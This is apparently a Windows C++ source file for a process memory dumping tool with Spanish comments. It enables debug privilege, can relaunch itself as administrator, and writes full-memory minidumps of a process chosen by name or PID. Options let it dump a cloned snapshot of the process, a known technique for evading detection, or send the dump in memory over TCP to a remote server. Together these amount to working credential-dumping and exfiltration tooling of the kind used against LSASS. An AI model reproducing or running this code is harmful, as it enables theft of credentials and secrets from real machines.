#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <Windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm> // Para std::find

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Dbghelp.lib")

LPVOID dumpBuffer = nullptr; // Pointer to the memory buffer for the dump
DWORD dumpBufferSize = 1024 * 1024 * 1024; // Size of the buffer, e.g., 75 MB
DWORD dumpBufferOffset = 0; 


// Convierte una cadena de caracteres std::string a std::wstring
std::wstring StringToWString(const std::string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

// Intenta reiniciar el programa con privilegios elevados
void RestartProgramAsAdmin(const std::string& exePath, const std::vector<std::string>& argsVec) {
    std::wstring wExePath = StringToWString(exePath);
    std::wstring wArgs;
    // Construir la cadena de argumentos, excluyendo "-p"
    for (const auto& arg : argsVec) {
        if (arg != "-p") {
            if (!wArgs.empty()) wArgs += L" ";
            wArgs += StringToWString(arg);
        }
    }

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = wExePath.c_str();
    sei.lpParameters = wArgs.c_str();
    sei.nShow = SW_SHOW;

    if (!ShellExecuteEx(&sei)) {
        DWORD dwError = GetLastError();
        if (dwError == ERROR_CANCELLED) {
            std::cerr << "Administrator privileges are required." << std::endl;
        }
        else {
            std::cerr << "Failed to restart program as admin. Error code: " << dwError << std::endl;
        }
    }

    exit(0);
}

// Encuentra el ID de un proceso dado su nombre
DWORD FindProcessId(const std::string& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { sizeof(pe32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::wstring wProcessName = StringToWString(processName);
                if (wProcessName == std::wstring(pe32.szExeFile)) {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

BOOL CALLBACK minidumpCallback(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    LPVOID destination = nullptr; // Mover la declaración fuera del switch
    LPVOID source = nullptr;      // Mover la declaración fuera del switch
    DWORD bufferSize = 0;         // Mover la declaración fuera del switch

    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        std::cout << "IoStartCallback" << std::endl;
        CallbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback:
        
        if (dumpBuffer != nullptr && (dumpBufferOffset + CallbackInput->Io.BufferBytes) <= dumpBufferSize) {
            CallbackOutput->Status = S_OK; 
            std::cout << "IoWriteAllCallback" << std::endl;
            // Las variables ya están declaradas, solo las inicializamos aquí
            source = CallbackInput->Io.Buffer;
            destination = (LPBYTE)dumpBuffer + dumpBufferOffset;
            bufferSize = CallbackInput->Io.BufferBytes;

            if ((dumpBufferOffset + bufferSize) > dumpBufferSize) {
                CallbackOutput->Status = S_FALSE; // Fallo, buffer lleno
                break; // Asegúrate de romper el caso si el buffer está lleno
            }

            CopyMemory(destination, source, bufferSize);
            dumpBufferOffset += bufferSize; // Actualiza el offset después de copiar
        }
        else {
            CallbackOutput->Status = S_FALSE; // Indica fallo si el buffer está lleno o no inicializado
        }
        break;

    case IoFinishCallback:
        std::cout << "IoFinishCallback" << std::endl;
        CallbackOutput->Status = S_OK;
        break;

    default:
        return FALSE; // Tipo de callback no soportado
    }
    return TRUE;
}


bool InitializeDumpBuffer() {
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);
    if (dumpBuffer == nullptr) {
        std::cerr << "Failed to allocate memory for dump buffer." << std::endl;
        return false;
    }
    dumpBufferOffset = 0; // Reset offset to 0
    return true;
}

bool SendDumpToServer(DWORD processId, const std::string& serverAddress, const std::string& port) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = nullptr, * ptr = nullptr, hints;
    int iResult;

    // Inicializa Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << std::endl;
        return false;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resuelve la dirección y puerto del servidor
    iResult = getaddrinfo(serverAddress.c_str(), port.c_str(), &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return false;
    }

    // Intenta conectar con el servidor
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cerr << "Socket failed: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return false;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        return false;
    }

    // Inicializa el buffer de volcado
    if (!InitializeDumpBuffer()) {
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (processHandle == NULL) {
        std::cerr << "OpenProcess failed." << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    MINIDUMP_CALLBACK_INFORMATION mci;
    mci.CallbackRoutine = minidumpCallback;
    mci.CallbackParam = NULL;

    // Genera el volcado de memoria
    if (!MiniDumpWriteDump(processHandle, processId, NULL, MiniDumpWithFullMemory, NULL, NULL, &mci)) {
        std::cerr << "MiniDumpWriteDump failed." << std::endl;
        CloseHandle(processHandle);
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    // Envía el buffer al servidor
    iResult = send(ConnectSocket, (const char*)dumpBuffer, dumpBufferOffset, 0);
    if (iResult == SOCKET_ERROR) {
        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    std::cout << "Dump sent successfully. Bytes sent: " << iResult << std::endl;

    // Limpieza
    CloseHandle(processHandle);
    closesocket(ConnectSocket);
    WSACleanup();
    HeapFree(GetProcessHeap(), 0, dumpBuffer);

    return true;
}

// Crea un volcado de memoria de un proceso
bool CreateMiniDump(DWORD processId, const std::string& dumpFilePath) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "Error: Unable to open process with PID " << processId << std::endl;
        return false;
    }

    HANDLE hFile = CreateFile(StringToWString(dumpFilePath).c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Unable to create dump file" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    BOOL success = MiniDumpWriteDump(hProcess, processId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
  
    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (!success) {
        std::cerr << "Error: MiniDumpWriteDump failed" << std::endl;
        return false;
    }

    std::cout << "Dump created successfully for PID " << processId << std::endl;
    return true;
}

bool SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tokenPriv;
    LUID luidDebug;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luidDebug;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}




BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

bool CloneAndDumpProcess(DWORD processId, const std::string& dumpFilePath) {
    DWORD PID = processId; 
    HANDLE Handle = NULL;
    HANDLE outFile = CreateFile(L"processSnaap.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";



    Handle = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);

    HANDLE snapshotHandle = NULL;
    DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
    CallbackInfo.CallbackParam = NULL;

    DWORD result = PssCaptureSnapshot(Handle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
    if (result != ERROR_SUCCESS) {
        std::cerr << "PssCaptureSnapshot failed with error: " << result << std::endl;
        CloseHandle(Handle);
        return false;
    }

    BOOL isDumped = MiniDumpWriteDump(snapshotHandle, PID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

    if (isDumped) {
        std::cout << "[+] PID: " <<PID<< " dumped successfully!" << std::endl;
    }
    else {
    }

    PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
    return 0;
}



int main(int argc, char* argv[]) {
    // Inicializar Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " [-pid <ProcessID> | -name <ProcessName>] <DumpFilePath> [-p (for admin privileges)] [-r for clone process and clone][-S <ServerAddress:Port>]" << std::endl;
        WSACleanup(); // Limpieza antes de salir
        return 1;
    }
    if (SetDebugPrivilege()) {
        std::cout << "Debug privilege set successfully." << std::endl;
    }
    else {
        std::cout << "Failed to set debug privilege." << std::endl;
    }


    std::string exePath = argv[0];
    std::vector<std::string> argsVec(argv + 1, argv + argc);

    bool requireElevation = std::find(argsVec.begin(), argsVec.end(), "-p") != argsVec.end();
    if (requireElevation) {
        RestartProgramAsAdmin(exePath, argsVec);
        // No olvides que RestartProgramAsAdmin llama a exit(0), así que el código después de esta llamada no se ejecutará.
    }

    std::string option = argsVec[0];
    std::string value = argsVec[1];
    std::string dumpFilePath = argsVec.size() >= 3 && argsVec[2][0] != '-' ? argsVec[2] : "process.dmp";

    std::string serverAddress;
    std::string port;

    bool sendToServer = false;
    bool cloneProcess = false; 

    auto cloneOptionIt = std::find(argsVec.begin(), argsVec.end(), "-r");
    if (cloneOptionIt != argsVec.end()) {
        cloneProcess = true;
    }
    auto serverOptionIt = std::find(argsVec.begin(), argsVec.end(), "-S");
    if (serverOptionIt != argsVec.end()) {
        if (std::next(serverOptionIt) != argsVec.end() && std::next(serverOptionIt)->find(':') != std::string::npos) {
            sendToServer = true;
            std::string serverAddressPort = *std::next(serverOptionIt);
            auto delimiterPos = serverAddressPort.find(':');
            serverAddress = serverAddressPort.substr(0, delimiterPos);
            port = serverAddressPort.substr(delimiterPos + 1);
        }
        else {
            std::cerr << "Invalid or missing server address and port after -S option. Expected format: -S <Address:Port>" << std::endl;
            WSACleanup();
            return 1;
        }
    }

    DWORD processId = 0;
    if (option == "-pid") {
        processId = std::stoul(value);
    }
    else if (option == "-name") {
        processId = FindProcessId(value);
        if (processId == 0) {
            std::cerr << "Error: Process with name " << value << " not found." << std::endl;
            WSACleanup();
            return 1;
        }
    }
    else {
        std::cerr << "Invalid option: " << option << std::endl;
        WSACleanup();
        return 1;
    }

    if (!sendToServer) {
        bool result;
        if (cloneProcess) {
            result = CloneAndDumpProcess(processId, dumpFilePath);
        }
        else {
            result = CreateMiniDump(processId, dumpFilePath);
        }
        WSACleanup(); // Limpieza antes de salir
        return result ? 0 : 1;
    }
    else {
        // Enviar volcado al servidor
        bool result = SendDumpToServer(processId, serverAddress, port);
        WSACleanup(); // Limpieza antes de salir
        return result ? 0 : 1;
    }
}
